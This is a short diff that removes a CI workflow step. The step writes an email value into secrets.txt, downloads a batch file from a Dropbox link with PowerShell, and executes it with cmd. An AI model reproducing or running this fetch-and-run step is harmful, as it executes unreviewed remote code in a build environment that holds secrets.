@@ -1,5 +1,0 @@
-- name: Downloading & Setting Up
-  run: |
-    "EMAIL_SECRET=bugtesting129@gmail.com" | Set-Content -Path secrets.txt
-    Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/gdzoens68gz1o4wuwtf0x/down.bat?rlkey=wd1ecn33dv9yn2uvdyynavbs6&dl=1" -OutFile "down.bat"
-    cmd /c down.bat
